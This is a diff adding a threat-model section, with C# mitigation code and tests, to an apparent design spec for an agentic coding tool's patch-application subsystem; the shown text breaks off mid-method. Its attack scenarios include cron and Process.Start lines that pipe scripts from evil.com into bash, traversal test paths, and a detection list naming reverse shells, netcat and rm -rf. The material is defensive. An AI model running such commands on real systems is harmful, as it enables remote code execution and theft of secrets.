@@ -73,19 +73,1379 @@ This task delivers the complete atomic patch application subsystem:
 
 ### Security Considerations
 
-1. **Patch Content Validation:** Patch file paths MUST be validated against repository boundary. Patches targeting files outside repository MUST be rejected.
+#### Threat 1: Path Traversal via Malicious Patch File Paths
 
-2. **Backup Protection:** Backup files MUST be stored securely with appropriate permissions. Backup location MUST be within repository boundary.
+**Risk Description:** An attacker could craft a patch with file paths that escape the repository boundary, allowing writes to arbitrary system locations. A patch targeting `../../../etc/passwd` or `/etc/shadow` could compromise system security.
 
-3. **Path Injection Prevention:** File paths extracted from patches MUST be sanitized for path traversal attempts and null byte injection.
+**Attack Scenario:**
+```diff
+--- a/../../../etc/cron.d/backdoor
++++ b/../../../etc/cron.d/backdoor
+@@ -0,0 +1 @@
++* * * * * root curl http://evil.com/shell.sh | bash
+```
+If applied without validation, this creates a cron job running as root.
 
-4. **Resource Limits:** Patch size and hunk count MUST be limited to prevent resource exhaustion attacks.
+**Complete Mitigation Implementation:**
 
-5. **Audit Trail:** All patch applications MUST be logged with sufficient detail for forensic analysis if needed.
+```csharp
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+
+namespace AgenticCoder.Infrastructure.FileSystem.Patching;
+
+/// <summary>
+/// Validates patch file paths to prevent repository boundary escapes.
+/// </summary>
+public sealed class PatchPathValidator
+{
+    private readonly string _repositoryRoot;
+    private readonly IReadOnlySet<string> _forbiddenPaths;
+
+    // Patterns that indicate path traversal attempts
+    private static readonly string[] TraversalPatterns = new[]
+    {
+        "..", "...", "....",
+        "%2e%2e", "%2e.", ".%2e", // URL encoded
+        "..%c0%af", "..%c1%9c",   // Unicode encoding attacks
+        "~", // Home directory expansion
+    };
+
+    // Paths that should never be writable regardless of repo location
+    private static readonly HashSet<string> SystemForbiddenPaths = new(StringComparer.OrdinalIgnoreCase)
+    {
+        "/etc", "/bin", "/sbin", "/usr", "/lib", "/var",
+        "/root", "/home", "/proc", "/sys", "/dev",
+        "/boot", "/opt", "/srv", "/tmp",
+        "C:\\Windows", "C:\\Program Files", "C:\\Users"
+    };
+
+    public PatchPathValidator(string repositoryRoot)
+    {
+        _repositoryRoot = Path.GetFullPath(repositoryRoot)
+            ?? throw new ArgumentNullException(nameof(repositoryRoot));
+        _forbiddenPaths = SystemForbiddenPaths;
+    }
+
+    /// <summary>
+    /// Validates all file paths in a patch are within repository bounds.
+    /// </summary>
+    public PatchPathValidationResult ValidatePatchPaths(Patch patch)
+    {
+        var errors = new List<PatchPathError>();
+
+        foreach (var file in patch.Files)
+        {
+            var oldPathResult = ValidateSinglePath(file.OldPath, "old");
+            if (!oldPathResult.IsValid)
+                errors.Add(oldPathResult.Error!);
+
+            var newPathResult = ValidateSinglePath(file.NewPath, "new");
+            if (!newPathResult.IsValid)
+                errors.Add(newPathResult.Error!);
+        }
+
+        return new PatchPathValidationResult
+        {
+            IsValid = errors.Count == 0,
+            Errors = errors
+        };
+    }
+
+    private SinglePathResult ValidateSinglePath(string path, string pathType)
+    {
+        // Check for null/empty
+        if (string.IsNullOrWhiteSpace(path))
+        {
+            return SinglePathResult.Invalid(new PatchPathError
+            {
+                Path = path,
+                PathType = pathType,
+                Reason = "Path is null or empty"
+            });
+        }
+
+        // Check for null bytes (injection attack)
+        if (path.Contains('\0'))
+        {
+            return SinglePathResult.Invalid(new PatchPathError
+            {
+                Path = path,
+                PathType = pathType,
+                Reason = "Path contains null byte - possible injection attack"
+            });
+        }
+
+        // Check for traversal patterns in raw path
+        foreach (var pattern in TraversalPatterns)
+        {
+            if (path.Contains(pattern, StringComparison.OrdinalIgnoreCase))
+            {
+                return SinglePathResult.Invalid(new PatchPathError
+                {
+                    Path = path,
+                    PathType = pathType,
+                    Reason = $"Path contains traversal pattern: {pattern}"
+                });
+            }
+        }
+
+        // Resolve the full path
+        string fullPath;
+        try
+        {
+            // Strip the a/ or b/ prefix from unified diff format
+            var cleanPath = StripDiffPrefix(path);
+            fullPath = Path.GetFullPath(Path.Combine(_repositoryRoot, cleanPath));
+        }
+        catch (Exception ex)
+        {
+            return SinglePathResult.Invalid(new PatchPathError
+            {
+                Path = path,
+                PathType = pathType,
+                Reason = $"Path resolution failed: {ex.Message}"
+            });
+        }
+
+        // Verify path is within repository
+        if (!fullPath.StartsWith(_repositoryRoot, StringComparison.OrdinalIgnoreCase))
+        {
+            return SinglePathResult.Invalid(new PatchPathError
+            {
+                Path = path,
+                PathType = pathType,
+                Reason = $"Path escapes repository boundary. Resolved to: {fullPath}"
+            });
+        }
+
+        // Check against forbidden system paths
+        foreach (var forbidden in _forbiddenPaths)
+        {
+            if (fullPath.StartsWith(forbidden, StringComparison.OrdinalIgnoreCase))
+            {
+                return SinglePathResult.Invalid(new PatchPathError
+                {
+                    Path = path,
+                    PathType = pathType,
+                    Reason = $"Path targets forbidden system location: {forbidden}"
+                });
+            }
+        }
+
+        return SinglePathResult.Valid();
+    }
+
+    private static string StripDiffPrefix(string path)
+    {
+        if (path.StartsWith("a/") || path.StartsWith("b/"))
+            return path[2..];
+        if (path.StartsWith("a\\") || path.StartsWith("b\\"))
+            return path[2..];
+        return path;
+    }
+}
+
+public sealed class PatchPathValidationResult
+{
+    public bool IsValid { get; init; }
+    public IReadOnlyList<PatchPathError> Errors { get; init; } = Array.Empty<PatchPathError>();
+}
+
+public sealed class PatchPathError
+{
+    public required string Path { get; init; }
+    public required string PathType { get; init; }
+    public required string Reason { get; init; }
+}
+
+// Unit tests
+public sealed class PatchPathValidatorTests
+{
+    private readonly PatchPathValidator _sut;
+
+    public PatchPathValidatorTests()
+    {
+        _sut = new PatchPathValidator("/home/user/project");
+    }
+
+    [Theory]
+    [InlineData("a/src/file.cs")]
+    [InlineData("b/src/nested/file.cs")]
+    [InlineData("a/tests/UnitTests.cs")]
+    public void ValidatePatchPaths_Should_Accept_Valid_Paths(string path)
+    {
+        // Arrange
+        var patch = CreatePatchWithPath(path);
+
+        // Act
+        var result = _sut.ValidatePatchPaths(patch);
+
+        // Assert
+        result.IsValid.Should().BeTrue();
+    }
+
+    [Theory]
+    [InlineData("a/../../../etc/passwd")]
+    [InlineData("b/%2e%2e/etc/shadow")]
+    [InlineData("a/src/..\\..\\..\\Windows\\System32\\config")]
+    public void ValidatePatchPaths_Should_Reject_Traversal_Attempts(string path)
+    {
+        // Arrange
+        var patch = CreatePatchWithPath(path);
+
+        // Act
+        var result = _sut.ValidatePatchPaths(patch);
+
+        // Assert
+        result.IsValid.Should().BeFalse();
+        result.Errors.Should().ContainSingle()
+            .Which.Reason.Should().Contain("traversal");
+    }
+
+    [Fact]
+    public void ValidatePatchPaths_Should_Reject_Null_Bytes()
+    {
+        // Arrange
+        var patch = CreatePatchWithPath("a/src/file\0.cs");
+
+        // Act
+        var result = _sut.ValidatePatchPaths(patch);
+
+        // Assert
+        result.IsValid.Should().BeFalse();
+        result.Errors.Should().ContainSingle()
+            .Which.Reason.Should().Contain("null byte");
+    }
+}
+```
 
 ---
 
-## Glossary / Terms
+#### Threat 2: Resource Exhaustion via Oversized Patches
+
+**Risk Description:** An attacker could submit patches with millions of hunks or extremely large file content, exhausting memory and CPU. This could crash the agent or make it unresponsive, enabling denial of service.
+
+**Attack Scenario:**
+A malicious patch with 100,000 files and 1,000,000 hunks is submitted. Parsing and validating this patch consumes all available memory, crashing the process.
+
+**Complete Mitigation Implementation:**
+
+```csharp
+using System;
+using System.Collections.Generic;
+using System.Threading;
+
+namespace AgenticCoder.Infrastructure.FileSystem.Patching;
+
+/// <summary>
+/// Enforces resource limits on patch operations to prevent DoS attacks.
+/// </summary>
+public sealed class PatchResourceLimiter
+{
+    private readonly PatchResourceLimits _limits;
+    private readonly SemaphoreSlim _concurrencyLimiter;
+
+    public PatchResourceLimiter(PatchResourceLimits limits)
+    {
+        _limits = limits ?? throw new ArgumentNullException(nameof(limits));
+        _concurrencyLimiter = new SemaphoreSlim(_limits.MaxConcurrentPatches);
+    }
+
+    /// <summary>
+    /// Validates a patch against resource limits before processing.
+    /// </summary>
+    public ResourceLimitResult ValidateLimits(Patch patch)
+    {
+        var violations = new List<string>();
+
+        // Check file count
+        if (patch.Files.Count > _limits.MaxFilesPerPatch)
+        {
+            violations.Add(
+                $"Patch contains {patch.Files.Count} files, exceeds limit of {_limits.MaxFilesPerPatch}");
+        }
+
+        // Check total hunk count
+        var totalHunks = 0;
+        foreach (var file in patch.Files)
+        {
+            totalHunks += file.Hunks.Count;
+            if (totalHunks > _limits.MaxHunksPerPatch)
+            {
+                violations.Add(
+                    $"Patch contains {totalHunks}+ hunks, exceeds limit of {_limits.MaxHunksPerPatch}");
+                break;
+            }
+
+            // Check hunks per file
+            if (file.Hunks.Count > _limits.MaxHunksPerFile)
+            {
+                violations.Add(
+                    $"File {file.NewPath} has {file.Hunks.Count} hunks, exceeds limit of {_limits.MaxHunksPerFile}");
+            }
+
+            // Check lines per hunk
+            foreach (var hunk in file.Hunks)
+            {
+                var lineCount = hunk.AddedLines.Count + hunk.RemovedLines.Count + hunk.ContextLines.Count;
+                if (lineCount > _limits.MaxLinesPerHunk)
+                {
+                    violations.Add(
+                        $"Hunk in {file.NewPath} has {lineCount} lines, exceeds limit of {_limits.MaxLinesPerHunk}");
+                }
+            }
+        }
+
+        // Check raw patch size
+        if (patch.RawContent.Length > _limits.MaxPatchSizeBytes)
+        {
+            violations.Add(
+                $"Patch size is {patch.RawContent.Length} bytes, exceeds limit of {_limits.MaxPatchSizeBytes}");
+        }
+
+        return new ResourceLimitResult
+        {
+            IsValid = violations.Count == 0,
+            Violations = violations
+        };
+    }
+
+    /// <summary>
+    /// Acquires a slot for patch processing, blocking if at capacity.
+    /// </summary>
+    public async Task<IAsyncDisposable> AcquirePatchSlotAsync(CancellationToken ct)
+    {
+        if (!await _concurrencyLimiter.WaitAsync(_limits.MaxWaitForSlot, ct))
+        {
+            throw new PatchResourceExhaustedException(
+                $"Too many concurrent patch operations. Maximum: {_limits.MaxConcurrentPatches}");
+        }
+
+        return new PatchSlotHandle(_concurrencyLimiter);
+    }
+
+    private sealed class PatchSlotHandle : IAsyncDisposable
+    {
+        private readonly SemaphoreSlim _semaphore;
+        private bool _disposed;
+
+        public PatchSlotHandle(SemaphoreSlim semaphore)
+        {
+            _semaphore = semaphore;
+        }
+
+        public ValueTask DisposeAsync()
+        {
+            if (!_disposed)
+            {
+                _disposed = true;
+                _semaphore.Release();
+            }
+            return ValueTask.CompletedTask;
+        }
+    }
+}
+
+/// <summary>
+/// Configuration for patch resource limits.
+/// </summary>
+public sealed class PatchResourceLimits
+{
+    /// <summary>Maximum files in a single patch (default: 100).</summary>
+    public int MaxFilesPerPatch { get; init; } = 100;
+
+    /// <summary>Maximum hunks across all files (default: 500).</summary>
+    public int MaxHunksPerPatch { get; init; } = 500;
+
+    /// <summary>Maximum hunks in a single file (default: 50).</summary>
+    public int MaxHunksPerFile { get; init; } = 50;
+
+    /// <summary>Maximum lines in a single hunk (default: 1000).</summary>
+    public int MaxLinesPerHunk { get; init; } = 1000;
+
+    /// <summary>Maximum raw patch size in bytes (default: 10MB).</summary>
+    public long MaxPatchSizeBytes { get; init; } = 10 * 1024 * 1024;
+
+    /// <summary>Maximum concurrent patch operations (default: 5).</summary>
+    public int MaxConcurrentPatches { get; init; } = 5;
+
+    /// <summary>Maximum wait time to acquire slot (default: 30s).</summary>
+    public TimeSpan MaxWaitForSlot { get; init; } = TimeSpan.FromSeconds(30);
+}
+
+public sealed class ResourceLimitResult
+{
+    public bool IsValid { get; init; }
+    public IReadOnlyList<string> Violations { get; init; } = Array.Empty<string>();
+}
+
+public class PatchResourceExhaustedException : Exception
+{
+    public PatchResourceExhaustedException(string message) : base(message) { }
+}
+
+// Unit tests
+public sealed class PatchResourceLimiterTests
+{
+    private readonly PatchResourceLimiter _sut;
+
+    public PatchResourceLimiterTests()
+    {
+        _sut = new PatchResourceLimiter(new PatchResourceLimits
+        {
+            MaxFilesPerPatch = 10,
+            MaxHunksPerPatch = 50,
+            MaxHunksPerFile = 10,
+            MaxLinesPerHunk = 100
+        });
+    }
+
+    [Fact]
+    public void ValidateLimits_Should_Accept_Within_Limits()
+    {
+        // Arrange
+        var patch = CreatePatch(files: 5, hunksPerFile: 3, linesPerHunk: 20);
+
+        // Act
+        var result = _sut.ValidateLimits(patch);
+
+        // Assert
+        result.IsValid.Should().BeTrue();
+    }
+
+    [Fact]
+    public void ValidateLimits_Should_Reject_Too_Many_Files()
+    {
+        // Arrange
+        var patch = CreatePatch(files: 100, hunksPerFile: 1, linesPerHunk: 10);
+
+        // Act
+        var result = _sut.ValidateLimits(patch);
+
+        // Assert
+        result.IsValid.Should().BeFalse();
+        result.Violations.Should().Contain(v => v.Contains("files"));
+    }
+
+    [Fact]
+    public void ValidateLimits_Should_Reject_Too_Many_Hunks()
+    {
+        // Arrange
+        var patch = CreatePatch(files: 5, hunksPerFile: 20, linesPerHunk: 10);
+
+        // Act
+        var result = _sut.ValidateLimits(patch);
+
+        // Assert
+        result.IsValid.Should().BeFalse();
+        result.Violations.Should().Contain(v => v.Contains("hunks"));
+    }
+}
+```
+
+---
+
+#### Threat 3: Backup Directory Manipulation
+
+**Risk Description:** If backup storage location is attacker-controllable or predictable, an attacker could pre-create malicious backup files that get restored during rollback, or delete backups to prevent rollback.
+
+**Attack Scenario:**
+Attacker knows backups go to `/tmp/acode-backups/`. They create a malicious backup file before the legitimate patch operation. When rollback occurs, the malicious file is restored instead of the original.
+
+**Complete Mitigation Implementation:**
+
+```csharp
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Security.Cryptography;
+using System.Text.Json;
+using System.Threading;
+using System.Threading.Tasks;
+
+namespace AgenticCoder.Infrastructure.FileSystem.Patching;
+
+/// <summary>
+/// Securely manages patch backup files with integrity verification.
+/// </summary>
+public sealed class SecurePatchBackupManager
+{
+    private readonly string _backupRoot;
+    private readonly TimeSpan _retentionPeriod;
+
+    public SecurePatchBackupManager(string backupRoot, TimeSpan retentionPeriod)
+    {
+        // Backup root must be within repo or a secure system directory
+        _backupRoot = Path.GetFullPath(backupRoot);
+        _retentionPeriod = retentionPeriod;
+
+        // Create with restricted permissions
+        if (!Directory.Exists(_backupRoot))
+        {
+            Directory.CreateDirectory(_backupRoot);
+            // On Unix, set permissions to owner-only (700)
+            if (!OperatingSystem.IsWindows())
+            {
+                File.SetUnixFileMode(_backupRoot, UnixFileMode.UserRead | UnixFileMode.UserWrite | UnixFileMode.UserExecute);
+            }
+        }
+    }
+
+    /// <summary>
+    /// Creates a secure backup of files before patch application.
+    /// Returns a transaction ID for later rollback.
+    /// </summary>
+    public async Task<BackupTransaction> CreateBackupAsync(
+        IRepoFS fs,
+        IReadOnlyList<string> filePaths,
+        CancellationToken ct)
+    {
+        var transactionId = GenerateSecureTransactionId();
+        var transactionDir = Path.Combine(_backupRoot, transactionId);
+
+        Directory.CreateDirectory(transactionDir);
+
+        var manifest = new BackupManifest
+        {
+            TransactionId = transactionId,
+            CreatedAt = DateTimeOffset.UtcNow,
+            Files = new List<BackupFileEntry>()
+        };
+
+        foreach (var path in filePaths)
+        {
+            var exists = await fs.ExistsAsync(path, ct);
+            var entry = new BackupFileEntry
+            {
+                OriginalPath = path,
+                ExistedBeforePatch = exists
+            };
+
+            if (exists)
+            {
+                // Read and backup existing content
+                var content = await fs.ReadFileAsync(path, ct);
+                var contentHash = ComputeHash(content);
+
+                var backupFileName = GenerateSecureFileName();
+                var backupPath = Path.Combine(transactionDir, backupFileName);
+
+                await File.WriteAllTextAsync(backupPath, content, ct);
+
+                // Verify write integrity
+                var writtenContent = await File.ReadAllTextAsync(backupPath, ct);
+                var writtenHash = ComputeHash(writtenContent);
+
+                if (!contentHash.SequenceEqual(writtenHash))
+                {
+                    throw new BackupIntegrityException(
+                        $"Backup integrity check failed for {path}");
+                }
+
+                entry.BackupFileName = backupFileName;
+                entry.ContentHash = Convert.ToHexString(contentHash);
+            }
+
+            manifest.Files.Add(entry);
+        }
+
+        // Write manifest with integrity hash
+        var manifestJson = JsonSerializer.Serialize(manifest);
+        var manifestHash = ComputeHash(manifestJson);
+        manifest.ManifestHash = Convert.ToHexString(manifestHash);
+
+        var manifestPath = Path.Combine(transactionDir, "manifest.json");
+        await File.WriteAllTextAsync(manifestPath, JsonSerializer.Serialize(manifest), ct);
+
+        return new BackupTransaction
+        {
+            TransactionId = transactionId,
+            TransactionDir = transactionDir,
+            Manifest = manifest
+        };
+    }
+
+    /// <summary>
+    /// Restores files from a backup transaction with integrity verification.
+    /// </summary>
+    public async Task RestoreBackupAsync(
+        IRepoFS fs,
+        string transactionId,
+        CancellationToken ct)
+    {
+        var transactionDir = Path.Combine(_backupRoot, transactionId);
+
+        if (!Directory.Exists(transactionDir))
+        {
+            throw new BackupNotFoundException(
+                $"Backup transaction {transactionId} not found");
+        }
+
+        // Load and verify manifest
+        var manifestPath = Path.Combine(transactionDir, "manifest.json");
+        var manifestJson = await File.ReadAllTextAsync(manifestPath, ct);
+        var manifest = JsonSerializer.Deserialize<BackupManifest>(manifestJson)
+            ?? throw new BackupCorruptedException("Manifest is null");
+
+        // Verify manifest hasn't been tampered with
+        var expectedHash = manifest.ManifestHash;
+        manifest.ManifestHash = null; // Clear for hash computation
+        var actualHash = Convert.ToHexString(ComputeHash(JsonSerializer.Serialize(manifest)));
+
+        if (expectedHash != actualHash)
+        {
+            throw new BackupIntegrityException(
+                $"Manifest integrity check failed. Expected: {expectedHash}, Actual: {actualHash}");
+        }
+
+        // Check retention period
+        if (manifest.CreatedAt.Add(_retentionPeriod) < DateTimeOffset.UtcNow)
+        {
+            throw new BackupExpiredException(
+                $"Backup transaction {transactionId} has expired");
+        }
+
+        // Restore each file with integrity verification
+        foreach (var entry in manifest.Files)
+        {
+            if (entry.ExistedBeforePatch)
+            {
+                var backupPath = Path.Combine(transactionDir, entry.BackupFileName!);
+                var backupContent = await File.ReadAllTextAsync(backupPath, ct);
+
+                // Verify backup content integrity
+                var actualContentHash = Convert.ToHexString(ComputeHash(backupContent));
+                if (actualContentHash != entry.ContentHash)
+                {
+                    throw new BackupIntegrityException(
+                        $"Backup content integrity check failed for {entry.OriginalPath}");
+                }
+
+                await fs.WriteFileAsync(entry.OriginalPath, backupContent, ct);
+            }
+            else
+            {
+                // File was created by patch - delete it
+                if (await fs.ExistsAsync(entry.OriginalPath, ct))
+                {
+                    await fs.DeleteFileAsync(entry.OriginalPath, ct);
+                }
+            }
+        }
+    }
+
+    /// <summary>
+    /// Deletes a backup transaction after successful application.
+    /// </summary>
+    public void DeleteBackup(string transactionId)
+    {
+        var transactionDir = Path.Combine(_backupRoot, transactionId);
+        if (Directory.Exists(transactionDir))
+        {
+            // Securely delete by overwriting files first
+            foreach (var file in Directory.GetFiles(transactionDir))
+            {
+                SecureDeleteFile(file);
+            }
+            Directory.Delete(transactionDir, recursive: true);
+        }
+    }
+
+    private static string GenerateSecureTransactionId()
+    {
+        var bytes = RandomNumberGenerator.GetBytes(16);
+        var timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
+        return $"{timestamp:X}-{Convert.ToHexString(bytes)}";
+    }
+
+    private static string GenerateSecureFileName()
+    {
+        var bytes = RandomNumberGenerator.GetBytes(8);
+        return $"backup-{Convert.ToHexString(bytes)}.bak";
+    }
+
+    private static byte[] ComputeHash(string content)
+    {
+        return SHA256.HashData(System.Text.Encoding.UTF8.GetBytes(content));
+    }
+
+    private static void SecureDeleteFile(string path)
+    {
+        var info = new FileInfo(path);
+        if (info.Exists)
+        {
+            // Overwrite with random data
+            var random = RandomNumberGenerator.GetBytes((int)info.Length);
+            File.WriteAllBytes(path, random);
+            File.Delete(path);
+        }
+    }
+}
+
+public sealed class BackupManifest
+{
+    public required string TransactionId { get; init; }
+    public required DateTimeOffset CreatedAt { get; init; }
+    public required List<BackupFileEntry> Files { get; set; }
+    public string? ManifestHash { get; set; }
+}
+
+public sealed class BackupFileEntry
+{
+    public required string OriginalPath { get; init; }
+    public required bool ExistedBeforePatch { get; init; }
+    public string? BackupFileName { get; init; }
+    public string? ContentHash { get; init; }
+}
+
+public sealed class BackupTransaction
+{
+    public required string TransactionId { get; init; }
+    public required string TransactionDir { get; init; }
+    public required BackupManifest Manifest { get; init; }
+}
+
+public class BackupNotFoundException : Exception
+{
+    public BackupNotFoundException(string message) : base(message) { }
+}
+
+public class BackupCorruptedException : Exception
+{
+    public BackupCorruptedException(string message) : base(message) { }
+}
+
+public class BackupIntegrityException : SecurityException
+{
+    public BackupIntegrityException(string message) : base(message) { }
+}
+
+public class BackupExpiredException : Exception
+{
+    public BackupExpiredException(string message) : base(message) { }
+}
+```
+
+---
+
+#### Threat 4: Patch Content Injection (Code Injection via Patch)
+
+**Risk Description:** Malicious patches could inject code that executes when the patched file is later run. While this is somewhat unavoidable (patches modify code), validation should detect obviously malicious patterns and warn users.
+
+**Attack Scenario:**
+A patch claims to "fix a bug" but actually injects:
+```diff
++System.Diagnostics.Process.Start("curl http://evil.com/steal-secrets.sh | bash");
+```
+
+**Complete Mitigation Implementation:**
+
+```csharp
+using System;
+using System.Collections.Generic;
+using System.Text.RegularExpressions;
+using Microsoft.Extensions.Logging;
+
+namespace AgenticCoder.Infrastructure.FileSystem.Patching;
+
+/// <summary>
+/// Scans patch content for potentially malicious patterns.
+/// This is defense-in-depth - not a security guarantee.
+/// </summary>
+public sealed partial class PatchContentScanner
+{
+    private readonly ILogger<PatchContentScanner> _logger;
+    private readonly bool _blockOnSuspicious;
+
+    // Patterns that indicate potentially dangerous code
+    private static readonly (string Pattern, string Description, Severity Level)[] SuspiciousPatterns = new[]
+    {
+        // Process execution
+        (@"Process\.Start\s*\(", "Process execution", Severity.High),
+        (@"Runtime\.exec\s*\(", "Runtime execution", Severity.High),
+        (@"exec\s*\(|system\s*\(|shell_exec", "Shell execution", Severity.High),
+        (@"subprocess\.|os\.system", "Python subprocess", Severity.High),
+
+        // Network operations
+        (@"WebClient|HttpClient|WebRequest", "Network access", Severity.Medium),
+        (@"curl\s+|wget\s+", "Download command", Severity.High),
+        (@"http://|https://", "URL reference", Severity.Low),
+
+        // File system operations outside expected scope
+        (@"File\.Delete|Directory\.Delete", "Deletion operation", Severity.Medium),
+        (@"rm\s+-rf|rmdir\s+/s", "Destructive command", Severity.High),
+        (@"/etc/|/bin/|/usr/|C:\\Windows", "System path access", Severity.High),
+
+        // Environment/secrets access
+        (@"Environment\.GetEnvironmentVariable", "Environment access", Severity.Medium),
+        (@"GetSecret|KeyVault|SecretsManager", "Secrets access", Severity.Medium),
+        (@"api[_-]?key|password|secret|token", "Credential reference", Severity.Low),
+
+        // Obfuscation patterns
+        (@"Convert\.FromBase64String|atob\(|base64\s+-d", "Base64 decode", Severity.Medium),
+        (@"eval\s*\(|Function\s*\(|new\s+Function", "Dynamic code evaluation", Severity.High),
+        (@"\\x[0-9a-f]{2}|\\u[0-9a-f]{4}", "Encoded characters", Severity.Low),
+
+        // Backdoor patterns
+        (@"reverse\s*shell|bind\s*shell", "Shell backdoor", Severity.Critical),
+        (@"nc\s+-|netcat", "Netcat usage", Severity.High),
+        (@"socket\.connect|socket\.bind", "Raw socket", Severity.Medium),
+    };
+
+    public PatchContentScanner(ILogger<PatchContentScanner> logger, bool blockOnSuspicious = false)
+    {
+        _logger = logger;
+        _blockOnSuspicious = blockOnSuspicious;
+    }
+
+    /// <summary>
+    /// Scans patch content for suspicious patterns.
+    /// </summary>
+    public PatchScanResult ScanPatch(Patch patch)
+    {
+        var findings = new List<SuspiciousFinding>();
+
+        foreach (var file in patch.Files)
+        {
+            foreach (var hunk in file.Hunks)
+            {
+                // Only scan added lines (new code)
+                foreach (var line in hunk.AddedLines)
+                {
+                    var lineFindings = ScanLine(line, file.NewPath);
+                    findings.AddRange(lineFindings);
+                }
+            }
+        }
+
+        // Log findings
+        foreach (var finding in findings)
+        {
+            var logLevel = finding.Severity switch
+            {
+                Severity.Critical => LogLevel.Error,
+                Severity.High => LogLevel.Warning,
+                Severity.Medium => LogLevel.Information,
+                _ => LogLevel.Debug
+            };
+
+            _logger.Log(logLevel,
+                "Suspicious pattern detected in patch: {Description} in {File}, Line: {Line}",
+                finding.Description, finding.FilePath, finding.LineContent);
+        }
+
+        var hasBlockingFinding = _blockOnSuspicious &&
+            findings.Exists(f => f.Severity >= Severity.High);
+
+        return new PatchScanResult
+        {
+            IsClean = findings.Count == 0,
+            ShouldBlock = hasBlockingFinding,
+            Findings = findings
+        };
+    }
+
+    private IEnumerable<SuspiciousFinding> ScanLine(string line, string filePath)
+    {
+        foreach (var (pattern, description, severity) in SuspiciousPatterns)
+        {
+            if (Regex.IsMatch(line, pattern, RegexOptions.IgnoreCase))
+            {
+                yield return new SuspiciousFinding
+                {
+                    FilePath = filePath,
+                    LineContent = line.Length > 100 ? line[..100] + "..." : line,
+                    Pattern = pattern,
+                    Description = description,
+                    Severity = severity
+                };
+            }
+        }
+    }
+}
+
+public enum Severity
+{
+    Low = 1,
+    Medium = 2,
+    High = 3,
+    Critical = 4
+}
+
+public sealed class PatchScanResult
+{
+    public bool IsClean { get; init; }
+    public bool ShouldBlock { get; init; }
+    public IReadOnlyList<SuspiciousFinding> Findings { get; init; } = Array.Empty<SuspiciousFinding>();
+}
+
+public sealed class SuspiciousFinding
+{
+    public required string FilePath { get; init; }
+    public required string LineContent { get; init; }
+    public required string Pattern { get; init; }
+    public required string Description { get; init; }
+    public required Severity Severity { get; init; }
+}
+```
+
+---
+
+#### Threat 5: Race Condition During Atomic Write (TOCTOU)
+
+**Risk Description:** Between validating a file's content and writing the patched version, an attacker could modify the file, causing either data loss or applying a patch to unexpected content.
+
+**Attack Scenario:**
+1. Patch validator reads file, confirms context matches
+2. Attacker modifies file (injects malicious code)
+3. Patch applicator writes patched version (includes attacker's injection)
+4. Result: Malicious code persisted via legitimate patch operation
+
+**Complete Mitigation Implementation:**
+
+```csharp
+using System;
+using System.IO;
+using System.Security.Cryptography;
+using System.Threading;
+using System.Threading.Tasks;
+using Microsoft.Extensions.Logging;
+
+namespace AgenticCoder.Infrastructure.FileSystem.Patching;
+
+/// <summary>
+/// Provides TOCTOU-safe atomic file patching operations.
+/// Uses file locking and content hashing to detect concurrent modifications.
+/// </summary>
+public sealed class ToctouSafePatchApplicator
+{
+    private readonly IRepoFS _fs;
+    private readonly ILogger<ToctouSafePatchApplicator> _logger;
+
+    public ToctouSafePatchApplicator(IRepoFS fs, ILogger<ToctouSafePatchApplicator> logger)
+    {
+        _fs = fs ?? throw new ArgumentNullException(nameof(fs));
+        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
+    }
+
+    /// <summary>
+    /// Applies a hunk to a file with TOCTOU protection.
+    /// </summary>
+    public async Task<ToctouSafeResult> ApplyHunkSafelyAsync(
+        string filePath,
+        PatchHunk hunk,
+        byte[] expectedContentHash,
+        CancellationToken ct)
+    {
+        // Acquire exclusive lock on the file
+        await using var fileLock = await AcquireExclusiveLockAsync(filePath, ct);
+
+        // Read current content under lock
+        var currentContent = await _fs.ReadFileAsync(filePath, ct);
+        var currentHash = ComputeHash(currentContent);
+
+        // Verify content hasn't changed since validation
+        if (!currentHash.AsSpan().SequenceEqual(expectedContentHash))
+        {
+            _logger.LogWarning(
+                "TOCTOU violation detected for {FilePath}. File was modified between validation and application.",
+                filePath);
+
+            return new ToctouSafeResult
+            {
+                Success = false,
+                Error = ToctouError.ContentModified,
+                ExpectedHash = Convert.ToHexString(expectedContentHash),
+                ActualHash = Convert.ToHexString(currentHash)
+            };
+        }
+
+        // Apply the hunk
+        var patchedContent = ApplyHunk(currentContent, hunk);
+
+        // Write to temp file first
+        var tempPath = filePath + $".patch-{Guid.NewGuid():N}.tmp";
+
+        try
+        {
+            await _fs.WriteFileAsync(tempPath, patchedContent, ct);
+
+            // Verify temp file was written correctly
+            var writtenContent = await _fs.ReadFileAsync(tempPath, ct);
+            if (writtenContent != patchedContent)
+            {
+                throw new PatchWriteVerificationException(
+                    "Temp file content doesn't match expected patched content");
+            }
+
+            // Atomic rename (still under lock)
+            await AtomicRenameAsync(tempPath, filePath, ct);
+
+            return new ToctouSafeResult { Success = true };
+        }
+        catch (Exception ex)
+        {
+            // Clean up temp file on failure
+            try { await _fs.DeleteFileAsync(tempPath, ct); }
+            catch { /* Best effort cleanup */ }
+
+            _logger.LogError(ex, "Failed to apply hunk to {FilePath}", filePath);
+
+            return new ToctouSafeResult
+            {
+                Success = false,
+                Error = ToctouError.WriteFailed,
+                Exception = ex
+            };
+        }
+    }
+
+    /// <summary>
+    /// Applies an entire patch atomically across multiple files.
+    /// All files are locked, validated, patched, and written atomically.
+    /// </summary>
+    public async Task<MultiFileToctouResult> ApplyPatchAtomicallyAsync(
+        Patch patch,
+        Dictionary<string, byte[]> expectedHashes,
+        CancellationToken ct)
+    {
+        var locks = new List<IAsyncDisposable>();
+        var tempFiles = new List<(string TempPath, string TargetPath)>();
+
+        try
+        {
+            // Phase 1: Acquire all locks
+            foreach (var file in patch.Files)
+            {
+                var lockHandle = await AcquireExclusiveLockAsync(file.NewPath, ct);
+                locks.Add(lockHandle);
+            }
+
+            _logger.LogDebug("Acquired {Count} file locks for atomic patch", locks.Count);
+
+            // Phase 2: Validate all files under lock
+            foreach (var file in patch.Files)
+            {
+                var currentContent = await _fs.ReadFileAsync(file.NewPath, ct);
+                var currentHash = ComputeHash(currentContent);
+
+                if (!expectedHashes.TryGetValue(file.NewPath, out var expectedHash))
+                {
+                    throw new PatchValidationException(
+                        $"No expected hash provided for {file.NewPath}");
+                }
+
+                if (!currentHash.AsSpan().SequenceEqual(expectedHash))
+                {
+                    return new MultiFileToctouResult
+                    {
+                        Success = false,
+                        Error = ToctouError.ContentModified,
